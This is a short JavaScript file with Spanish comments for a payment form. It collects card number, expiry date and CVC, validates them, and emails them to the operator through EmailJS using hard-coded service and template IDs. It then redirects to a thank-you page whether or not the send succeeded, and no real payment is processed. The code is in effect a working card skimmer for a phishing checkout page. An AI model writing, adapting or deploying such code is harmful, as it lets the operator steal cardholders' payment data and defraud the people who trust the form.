// Inicializa EmailJS con tu Public Key
(function() {
    emailjs.init('ReqtkWfjI392LAzFb'); // Public Key
})();

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Evita que el formulario se envíe de forma tradicional

    // Recopila los datos del formulario
    const cardData = {
        numero: document.getElementById('cardNumber').value, // Número de tarjeta
        fecha: document.getElementById('expiryDate').value, // Fecha de expiración
        cvc: document.getElementById('cvc').value // CVC
    };

    // Validaciones detalladas
    if (cardData.numero.length !== 16 || !/^\d+$/.test(cardData.numero)) {
        console.log('Número de tarjeta inválido'); // Mensaje en consola
        return; // Si el número de tarjeta no es válido, no hace nada
    }

    if (cardData.cvc.length !== 3 || !/^\d+$/.test(cardData.cvc)) {
        console.log('CVC inválido'); // Mensaje en consola
        return; // Si el CVC no es válido, no hace nada
    }

    // Verifica que la fecha de expiración sea válida
    const currentDate = new Date();
    const expiryDate = new Date(cardData.fecha);
    if (expiryDate < currentDate) {
        console.log('Fecha de expiración inválida'); // Mensaje en consola
        return; // Si la fecha de expiración es anterior a la fecha actual, no hace nada
    }

    // Envía los datos a tu correo usando EmailJS
    emailjs.send("service_syrc1uk", "template_u3etoro", cardData) // Service ID y Template ID
        .then(() => {
            console.log('Correo enviado correctamente'); // Mensaje en consola
            // Redirige a la página de agradecimiento
            window.location.href = "thank-you.html";
        })
        .catch(error => {
            console.error('Error al enviar el correo:', error); // Imprime el error en la consola
            // Redirige a la página de agradecimiento incluso si hay un error
            window.location.href = "thank-you.html";
        });
});
